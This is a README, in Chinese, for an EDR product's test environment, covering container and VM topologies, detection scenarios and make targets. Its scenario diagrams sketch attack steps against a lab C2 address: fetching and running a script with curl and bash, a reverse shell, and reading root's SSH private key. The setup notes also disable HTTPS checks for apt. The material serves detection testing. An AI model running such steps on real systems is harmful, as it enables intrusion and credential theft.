# SysArmor 测试环境

两种独立拓扑(容器 / VM),验证 EDR 采集能**跨 namespace 和终端类型**工作:
同一套场景与事实契约,不管 endpoint 是容器还是 VM,都应产出结构一致的 Event/Signal/Incident。

## 拓扑

```
容器拓扑 (docker compose)               VM 拓扑 (Vagrant + libvirt)
┌──────────────────────────────┐        ┌──────────┐ ┌──────────┐
│ 宿主机内核                    │        │ attacker │ │  node-a  │
│  └─ Docker: sysarmor-net     │        │  VM(C2)  │ │ +agent   │
│      ├─ attacker  .99        │        │  独立内核  │ │  独立内核 │
│      ├─ node-a    .11        │        └──────────┘ └──────────┘
│      ├─ mgr       .10        │
│      └─ tetragon (eBPF 传感器)│        agent 自带/托管 Tetragon sensor
│                               │
│ tetragon 共享宿主内核          │        不需要 Docker
└──────────────────────────────┘
```

## 场景设计

每个场景是一份**契约**:给定攻击输入,系统必须(或不)产出指定的 Event/Signal/Incident。

| 场景 | ATT&CK | 核心命题 | Incident |
|---|---|---|---|
| **apt-fileless-c2** | T1190→T1059→T1105→T1571 | "响"的攻击:端侧产 terminal,云端缝合 | =1 |
| **apt-staged-drop** | T1105+T1574 | 云端图立论:跨 lineage,端侧无 terminal | =1 |
| **benign-ci-noise** | 误报基准 | 罕见度≠裸加:良性 CI 不产 Incident | =0 |

三场景构成最小完备集:正向(有攻击应检出)+ 横向(跨 lineage) + 负向(无攻击不误报)。

### apt-fileless-c2 (Log4Shell 风格)

```
java-web → bash → curl 10.66.0.99:8080/x.sh → bash /dev/shm/x.sh
                                                    ↓
                                              反弹 shell → 10.66.0.99:443
                                              后渗透: cat /root/.ssh/id_rsa
```

端侧单 lineage 内形成完整攻击链,产 terminal Signal。云端缝合成 Incident。
契约要点:端侧必须产 terminal,Incident=1,证据子图包含 bash→x.sh→C2 路径。

### apt-staged-drop (跨 lineage 分阶段)

```
lineage A (CI 构建): curl → 10.66.0.99:8080/helper → /var/lib/app/plugins/helper
                     ──── 间隔 GAP 秒 ────
lineage B (应用加载): /var/lib/app/plugins/helper --report 10.66.0.99:443
```

落盘与执行分属不同 lineage,端侧任一 lineage 都不产 terminal。
只有云端 provenance graph 通过共享文件节点 `/var/lib/app/plugins/helper` 缝合,才能成案。
契约要点:端侧无 terminal,Incident=1,lineage_ids≥2,证据子图含 helper 节点。control:关闭 cross_lineage 则 Incident=0。

### benign-ci-noise (良性 CI 噪音)

```
CI 构建 ×N 轮: curl → 10.66.0.99:8080 (拉依赖) → 编译 → 写 artifact
```

行为模式与攻击高度相似(curl 外联+文件写入+执行),但完全合法。
核心断言:Incident=0 (罕见度+结构收敛不误报)。
control:切换为 additive_threshold 则误报(Incident≥1),证明裸加是反模式。

## 目录结构

```
test/
├── Makefile                 e2e 入口
│
├── env/                     搭建:拓扑定义 + 镜像 + 资源
│   ├── container/
│   │   ├── compose.yaml      容器拓扑声明
│   │   └── images/           Dockerfile (attacker / node-a / mgr)
│   ├── vm/
│   │   ├── Vagrantfile       VM 拓扑声明
│   │   └── provision/        setup-c2 / setup-credentials
│   └── resources/            共享资源
│       ├── syscall-capture.yaml   replay/debug/perf 兼容 TracingPolicy
│       └── registry-token         假凭据
│
├── scenarios/               执行:攻击脚本 + 期望契约
│   ├── container/            容器拓扑场景 (docker exec 触发)
│   └── vm/                   VM 拓扑场景 (vagrant ssh 触发)
│
├── policies/                PolicyEnvelope 契约 (agent 配置,待接入)
│
├── harness/                 功能编排:start / stop / capture / assert / e2e report
│
├── tools/
│   ├── recorder/             长跑低扰动性能时间线
│   ├── diagnostics/          perf / pprof / strace 热点诊断
│   └── benchmarks/           collection / lifecycle benchmark matrix
│
├── workloads/               目标目录:exec/file/net/mixed/business 性能 workload
│
└── .results/                抓包样本
```

一句话:
- **env/** = 搭环境(搭完不动)
- **scenarios/** = 跑什么(攻击输入+断言)
- **policies/** = agent 契约(待接入)
- **harness/** = 怎么跑功能 E2E(生命周期+采集+判对错)
- **tools/recorder/** = 长期记录 CPU/RSS/EPS/drop/signal 时间线
- **tools/benchmarks/** = 成本多少(policy/sensor/workload 矩阵)
- **tools/diagnostics/** = 为什么慢(perf/pprof/strace)
- **workloads/** = 施加什么性能压力(后续收敛入口)

下一阶段测试 harness 会按 `references/docs/testing-benchmark.md` 收敛:

```text
E2E 验功能
Workload 造压力
Recorder 记长期时间线
Benchmark 做 sensor/policy/workload 矩阵
Diagnostic 查热点
```

原则:不要把性能 recorder、synthetic workload 或 perf/pprof 逻辑继续塞进功能 E2E 脚本。

## 快速开始

```bash
# 容器拓扑: build → manager/agent replay → sysarmorctl assert
make e2e TOPO=container SCENARIO=apt-fileless-c2
make e2e TOPO=container SCENARIO=apt-staged-drop
make e2e TOPO=container SCENARIO=benign-ci-noise

# VM 拓扑: VM 内执行场景，由 agent-owned Tetragon sensor 采集，sysarmorctl 直连 agent.sock 验证
make e2e TOPO=vm SCENARIO=apt-fileless-c2
make e2e TOPO=vm SCENARIO=apt-staged-drop
make e2e TOPO=vm SCENARIO=benign-ci-noise

# VM systemd + agent-owned real Tetragon process smoke
make e2e-agent-real-tetragon-owned-vm

# container + agent-owned real Tetragon process smoke
make e2e-agent-real-tetragon-owned-container

# 生命周期 smoke
make e2e TOPO=container SCENARIO=lifecycle-smoke
make e2e TOPO=vm SCENARIO=lifecycle-smoke

# graceful shutdown / spool flush smoke
make e2e-agent-shutdown

# startup capability/bundle failure -> degraded health
make e2e-agent-capability

# upload retry/backoff soak
make e2e-agent-retry-backoff

# parse error health / tamper smoke
make e2e-agent-parse-health

# queue backpressure/drop health smoke
make e2e-agent-backpressure

# policy/control-plane smoke
make e2e-policy-endpoint-disable
make e2e-policy-agent-refresh
make e2e-policy-cloud-disable
make e2e-policy-publish

# response/enforce observe-only smoke
make e2e-response-observe-only
make e2e-response-policy-deny
make e2e-response-scope-deny
make e2e-response-audit
make e2e-response-approval

# graph/evidence smoke
make e2e-graph-evidence
make e2e-incident-lifecycle
make e2e-incident-attach-evidence
make e2e-incident-merge

# store/Postgres foundation smoke
make e2e-store-status
make e2e-query-pagination
make e2e-postgres-store
make e2e-postgres-all

# Agent Gateway stream foundation smoke
make e2e-agent-gateway-session
make e2e-agent-gateway-downlink
make e2e-agent-gateway-frames
make e2e-agent-gateway-grpc-stream
make e2e-agent-gateway-stream-upload
make e2e-agent-gateway-stream-resume
make e2e-agent-gateway-policy-downlink
make e2e-agent-gateway-response-command
make e2e-agent-gateway-evidence-pullback
make e2e-agent-gateway-stream-all

# 性能基线 smoke
make perf TOPO=container DUR=10
make perf TOPO=vm DUR=10

# 资源占用采样: 容器看宿主机上的 EDR 容器/进程占用,VM 看 node-a 内部进程占用
make perf-resource TOPO=container SCENARIO=idle DUR=30
make perf-resource TOPO=vm SCENARIO=idle DUR=30

# VM 长跑 recorder: 可先启动 recorder,再运行任意 e2e/workload/手工操作,最后生成 summary
make recorder-vm-start RUN_ID=my-run
make recorder-vm-mark RUN_ID=my-run PHASE=workload_start DETAIL=mixed-edr-storm
make recorder-vm-stop RUN_ID=my-run
make recorder-vm-report RUN_ID=my-run

# VM collection policy benchmark: 每个 policy 都会生成 timeline/markers/summary,最后汇总 matrix
make bench-collection-vm DIAG_SCENARIO=mixed-edr-storm
make bench-collection-vm DIAG_SCENARIO=benign-business
make bench-edr-lifecycle-vm DIAG_SCENARIO=mixed-edr-storm
make bench-e2e-vm TOPO=vm SCENARIO=apt-fileless-c2

# VM Tetragon 热点诊断: 只用于定位 CPU 去向,不作为正式资源结论
make diag-tetragon-vm
make diag-tetragon-vm-workload DIAG_SCENARIO=mixed-edr-storm

# 汇总
make report

# 清理
make clean                           # down + 删 .results/
```

## 当前产品链路

当前 endpoint refinement 阶段的 VM 主运行路径是:

```
sysarmor-agent run --config ...（agent-owned Tetragon + tetra getevents）
  → normalize + endpoint detection engine
  → local event/signal stream buffer
  → sysarmorctl --agent-sock /var/run/sysarmor/agent.sock
  → harness/assert-vm-local.sh
```

container 和平台兼容测试仍保留旧 manager 路径:

```
sysarmor-agent run --config ...（agent-managed tetra getevents）
  → normalize + detection engine
  → durable spool + upload worker
  → sysarmor-manager AgentGateway upload/analytics/store
  → sysarmorctl JSON query
  → harness/assert.py
```

agent 默认用 HTTP upload 兼容 e2e;也支持 gRPC AgentGateway:

```bash
docker exec mgr /opt/sysarmor/bin/sysarmor-agent \
  --transport grpc --manager 127.0.0.1:9444 \
  --scenario grpc-smoke --input-jsonl /tmp/lifecycle.sensor.jsonl
```

`capture-vm` 当前只走本地 agent 主路径,不启动 manager/Kafka/Postgres。`capture-container` 仍保留平台/manager 路径,后续会继续向本地 agent-first 测试收敛。
agent 仍支持直接读取 Tetragon raw JSONL,用于 raw adapter smoke。

## 常用调试

```bash
# 查询 manager 健康
docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 status --json

# 查询信号和事件
docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 signals --scenario apt-fileless-c2 --layer endpoint --json
docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 events --scenario lifecycle-smoke --behavior process.exec --json

# control assertion: 反事实重算,不污染 store
docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 recompute --scenario apt-staged-drop --disable cloud.cross_lineage --json
docker exec mgr /opt/sysarmor/bin/sysarmorctl --mgr 127.0.0.1:9443 recompute --scenario benign-ci-noise --mode additive_threshold --json

# raw Tetragon adapter smoke
docker cp .results/apt-fileless-c2.vm.tetragon.jsonl tetragon:/tmp/raw.jsonl
docker exec tetragon /opt/sysarmor/bin/sysarmor-agent --manager http://10.66.0.10:9443 --scenario raw-fileless --stream-jsonl /tmp/raw.jsonl
```

## 前提

| 拓扑 | 需要 |
|---|---|
| 容器 | Docker Compose v2 |
| VM | libvirt + vagrant-libvirt |

## 注意事项

- 容器镜像源:`docker.1panel.live`(实测可用);`docker.1ms.run` 坏的。
- 容器内 apt 源需 sed 为 `mirrors.edge.kernel.org` + 关 https 校验。
- VM tetragon 从 GitHub release 下载 tarball;VM 内 GitHub 被墙时需手动下载。
- VM provision 默认不再预加载 `syscall-capture.yaml`;如需兼容 replay/debug/perf，可在 provision 时显式设置 `SYSARMOR_PRELOAD_VM_POLICY=1`。
- 容器拓扑 tetragon `--pid=host`,当前靠 TracingPolicy selector 过滤噪音;后续可加 `--cgroup-filter`。
- VM 拓扑修改脚本后需 `make provision`(rsync + re-provision)。
- VM topology 在 `mgr` VM 内运行 `sysarmor-manager` 和 `sysarmorctl`,在 `node-a` VM 内运行 agent stream。
- `perf-getevents` 是短窗口采集吞吐 baseline smoke,EPS 可能为 0。
- `recorder-vm-*` 是当前 VM 性能评估主线。它先启动低扰动采样,中间用 marker 记录 policy apply、steady、workload 等阶段,最后生成 `timeline.csv`、`markers.ndjson`、`events.ndjson`、`signals.ndjson`、`summary.json`。CPU 采样使用 VM 内 `/proc/<pid>/stat` jiffies delta,比短窗口 `ps %CPU` 更适合长跑比较。event/signal 计数使用启动时 stream sequence cursor + labels 过滤,并优先按 frame `observedAt` 与 marker 窗口做严格 delta。
- `bench-collection-vm` 和 `bench-edr-lifecycle-vm` 都基于 recorder,用于比较不同 collection policy 或生命周期阶段的 CPU/RSS/EPS/drop/signal。默认 collection policy 矩阵是 `minimal-high-signal / edr-balanced / incident-deep / debug-wide`。
- `bench-e2e-vm` 用 recorder 包住 VM 功能 E2E,用于把攻击场景结果和运行期间性能曲线放到同一份 run 里。
- `diag-tetragon-vm*` 只做 perf/pprof/strace 热点诊断。它可以复用 `workloads/vm/*`,但不输出正式资源结论。
- `perf-resource` 是 legacy 短窗口采样入口,输出 `.results/perf-resource.<topo>.<scenario>.csv`;后续会被 recorder/container recorder 替代。
